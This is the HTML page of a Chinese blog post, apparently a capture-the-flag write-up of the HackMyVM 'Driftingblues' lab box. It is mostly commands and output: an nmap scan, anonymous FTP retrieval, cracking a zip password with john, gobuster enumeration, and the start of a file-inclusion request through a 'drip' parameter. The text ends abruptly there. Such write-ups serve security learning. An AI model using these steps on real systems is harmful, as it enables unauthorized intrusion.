@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-Driftingblues靶场复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Driftingblues">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/50762.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-Driftingblues靶场复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67cc45d0066befcec6e15e39.png">
+<meta property="article:published_time" content="2025-03-08T13:03:33.000Z">
+<meta property="article:modified_time" content="2025-03-08T15:02:02.573Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="HMV">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67cc45d0066befcec6e15e39.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/50762.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Driftingblues | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">61</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/50762.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Driftingblues
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-08 21:03:33 / 修改时间：23:02:02" itemprop="dateCreated datePublished" datetime="2025-03-08T21:03:33+08:00">2025-03-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67cc4044066befcec6e15d70.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-Driftingblues靶场复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描 &#x2F; 信息收集"></a>端口扫描 &#x2F; 信息收集</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.58.44             </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>3-<span class="number">08</span> <span class="number">21</span>:<span class="number">02</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">58.44</span>)</span><br><span class="line">Host is up (<span class="number">0.026</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span> open  ftp     vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line">| <span class="params">ftp-syst:</span> </span><br><span class="line">|   <span class="params">STAT:</span> </span><br><span class="line">| FTP server <span class="params">status:</span></span><br><span class="line">|      Connected to ::ffff:<span class="number">192.168</span>.<span class="number">58.11</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="params">TYPE:</span> ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was <span class="number">1</span></span><br><span class="line">|      vsFTPd <span class="number">3.0</span>.<span class="number">3</span> <span class="operator">-</span> secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| <span class="params">ftp-anon:</span> Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|_-rwxrwxrwx    <span class="number">1</span> <span class="number">0</span>        <span class="number">0</span>             <span class="number">471</span> Sep <span class="number">19</span>  <span class="number">2021</span> respectmydrip.zip [<span class="params">NSE:</span> writeable]</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">8.2</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">3072</span> <span class="number">9</span>e:bb:af:<span class="number">6</span>f:<span class="number">7</span>d:a7:<span class="number">9</span>d:<span class="number">65</span>:a1:b1:a1:be:<span class="number">91</span>:cd:<span class="number">04</span>:<span class="number">28</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> a3:d3:c0:b4:c5:f9:c0:<span class="number">6</span>c:e5:<span class="number">47</span>:<span class="number">64</span>:fe:<span class="number">91</span>:c5:cd:c0 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">4</span>c:<span class="number">84</span>:da:<span class="number">5</span>a:ff:<span class="number">04</span>:b9:b5:<span class="number">5</span>c:<span class="number">5</span>a:be:<span class="number">21</span>:b6:<span class="number">0</span>e:<span class="number">45</span>:<span class="number">73</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.41</span> (Ubuntu)</span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">2</span> disallowed entries </span><br><span class="line">|_<span class="symbol">/dripisreal.txt</span> <span class="symbol">/etc/dripispowerful.html</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span>).</span><br><span class="line">MAC <span class="params">Address:</span> C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OSs:</span> Unix, Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">26.10</span> ms bogon (<span class="number">192.168</span>.<span class="number">58.44</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">11.22</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>开放21 22 80<br>先去匿名访问一下21端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ftp anonymous@192.168.58.44 </span><br><span class="line"></span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||27551|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Sep 19  2021 .</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Sep 19  2021 ..</span><br><span class="line">-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip</span><br><span class="line">ftp&gt; get respectmydrip.zip</span><br><span class="line">local: respectmydrip.zip remote: respectmydrip.zip</span><br><span class="line">229 Entering Extended Passive Mode (|||54209|)</span><br><span class="line">150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes).</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">*|   471        2.46 MiB/s    00:00 ETA</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">226 Transfer complete.</span></span></span><br><span class="line"><span class="emphasis"><span class="strong">471 bytes received in 00:00 (27.75 KiB/s)</span></span></span><br></pre></td></tr></table></figure></div>
+<p>发现有一个zip文件，拿到本地来看看  有密码就用john破解一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># unzip respectmydrip.zip                 </span></span><br><span class="line">Archive:  respectmydrip.<span class="built_in">zip</span></span><br><span class="line">[respectmydrip.<span class="built_in">zip</span>] respectmydrip.txt password: </span><br><span class="line">   skipping: respectmydrip.txt       incorrect password</span><br><span class="line">  inflating: secret.<span class="built_in">zip</span>              </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># zip2john respectmydrip.zip &gt; hash</span></span><br><span class="line">ver <span class="number">2.0</span> respectmydrip.<span class="built_in">zip</span>/respectmydrip.txt PKZIP Encr: cmplen=<span class="number">32</span>, decmplen=<span class="number">20</span>, crc=5C92F12B ts=96AB cs=5c92 <span class="built_in">type</span>=<span class="number">0</span></span><br><span class="line">ver <span class="number">2.0</span> respectmydrip.<span class="built_in">zip</span>/secret.<span class="built_in">zip</span> <span class="keyword">is</span> <span class="keyword">not</span> encrypted, <span class="keyword">or</span> stored <span class="keyword">with</span> non-handled compression <span class="built_in">type</span></span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># john hash                                            </span></span><br><span class="line">Using default <span class="built_in">input</span> encoding: UTF-<span class="number">8</span></span><br><span class="line">Loaded <span class="number">1</span> password <span class="built_in">hash</span> (PKZIP [<span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Proceeding <span class="keyword">with</span> single, rules:Single</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C to abort, almost <span class="built_in">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> <span class="built_in">any</span>.</span><br><span class="line">Proceeding <span class="keyword">with</span> wordlist:/usr/share/john/password.lst</span><br><span class="line">Proceeding <span class="keyword">with</span> incremental:ASCII</span><br><span class="line">072528035        (respectmydrip.<span class="built_in">zip</span>/respectmydrip.txt)     </span><br><span class="line">1g <span class="number">0</span>:<span class="number">00</span>:01:<span class="number">44</span> DONE <span class="number">3</span>/<span class="number">3</span> (<span class="number">2025</span>-03-08 <span class="number">21</span>:09) <span class="number">0.009575</span>g/s 33407Kp/s 33407Kc/s 33407KC/s <span class="number">072238647.</span><span class="number">.078169144</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display <span class="built_in">all</span> of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# unzip respectmydrip.<span class="keyword">zip</span></span><br><span class="line">Archive:  respectmydrip.<span class="keyword">zip</span></span><br><span class="line">[respectmydrip.<span class="keyword">zip</span>] respectmydrip.txt password: </span><br><span class="line"> extracting: respectmydrip.txt       </span><br><span class="line"><span class="keyword">replace</span> secret.<span class="keyword">zip</span>? [y]es, [<span class="keyword">n</span>]o, [A]ll, [<span class="keyword">N</span>]<span class="keyword">one</span>, [r]ename: y</span><br><span class="line">  inflating: secret.<span class="keyword">zip</span>      </span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">cat</span>  respectmydrip.txt      </span><br><span class="line">just focus <span class="keyword">on</span> <span class="string">&quot;drip&quot;</span>   </span><br></pre></td></tr></table></figure></div>
+
+<p>给了一个”drip”提示，然后这个secret.zip也要密码，drip不是这个secret的密码</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl http://192.168.58.44/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;body&gt;</span></span><br><span class="line">driftingblues is hacked again so it&#x27;s now called drippingblues. :D hahaha</span><br><span class="line"><span class="variable">&lt;br&gt;</span></span><br><span class="line">by</span><br><span class="line"><span class="variable">&lt;br&gt;</span></span><br><span class="line">travisscott &amp; thugger</span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span>  </span><br></pre></td></tr></table></figure></div>
+
+<p>从robots.txt中得到两个目录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.58.44/robots.txt</span></span><br><span class="line"><span class="params">User-agent:</span> <span class="operator">*</span></span><br><span class="line"><span class="params">Disallow:</span> <span class="symbol">/dripisreal.txt</span></span><br><span class="line"><span class="params">Disallow:</span> <span class="operator">/</span>etc<span class="operator">/</span>dripispowerful.html</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl 192.168.58.44//dripisreal.txt</span></span><br><span class="line">hello dear hacker wannabe,</span><br><span class="line"></span><br><span class="line">go <span class="keyword">for</span> this lyrics:</span><br><span class="line"></span><br><span class="line"><span class="keyword">https</span>://www.azlyrics.com/lyrics/youngthug/constantlyhating.html</span><br><span class="line"></span><br><span class="line">count <span class="keyword">the</span> n <span class="keyword">words</span> <span class="keyword">and</span> <span class="built_in">put</span> them side <span class="keyword">by</span> side <span class="keyword">then</span> md5sum <span class="keyword">it</span></span><br><span class="line"></span><br><span class="line">ie, hellohellohellohello &gt;&gt; md5sum hellohellohellohello</span><br><span class="line"></span><br><span class="line"><span class="keyword">it</span><span class="string">&#x27;s the password of ssh                                                                                                                                                        </span></span><br></pre></td></tr></table></figure></div>
+<p>按照他的说法就是把这个歌词里面有n的单词都提取出来让后排列在一起，但是我试了一下grep “n” 发现带有n的单词数量吓人，就先找别的信息了<br>用gobuster扫描的目录，发现首页是index.php</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.58.44  -x php,js,txt,jpg,png</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.58.44</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,js,txt,jpg,png</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br><span class="line">/index.php            (Status: 200) [Size: 138]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 78]</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br></pre></td></tr></table></figure></div>
+<p>这个php文件会不会有什么后门呢  用wfuzz扫一下没有扫出来，但是刚才ftp提取的文件里面有说<code>just focus on &quot;drip&quot;  </code>所以用drip试试<br>但是我用drip输入指令和文件什么返回都没有<br><img src="https://pic1.imgdb.cn/item/67cc45d0066befcec6e15e39.png"><br>卡住看了下wp后，原来要读取刚才robots.txt里面给的文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://192.168.58.44/index.php?drip=/etc/dripispowerful.html</span><br><span class="line"></span><br><span class="line"><span 